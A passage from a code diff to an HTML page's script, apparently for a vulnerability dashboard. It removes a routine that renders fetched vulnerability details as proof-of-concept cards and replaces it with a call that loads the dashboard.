-                }
-            }
-
-            if (detailedVulns.length === 0) {
-                console.log('Could not fetch vulnerability details');
-                return;
-            }
-
-            // Replace the container content with generated POC cards
-            const container = document.querySelector('.container');
-            const header = container.querySelector('header');
-            const backLink = container.querySelector('.back-link');
-
-            container.innerHTML = '';
-            container.appendChild(header);
-
-            detailedVulns.forEach(vuln => {
-                const cardHTML = generatePOCCard(vuln);
-                const tempDiv = document.createElement('div');
-                tempDiv.innerHTML = cardHTML;
-                container.appendChild(tempDiv.firstElementChild);
-            });
-
-            container.appendChild(backLink);
-
-            // Re-highlight code blocks
-            hljs.highlightAll();
-        }
-
-        // Initialize on page load
-        document.addEventListener('DOMContentLoaded', updatePage);
-
-        hljs.highlightAll();
+        // Start the application
+        loadDashboard();
     </script>
 </body>
 </html>
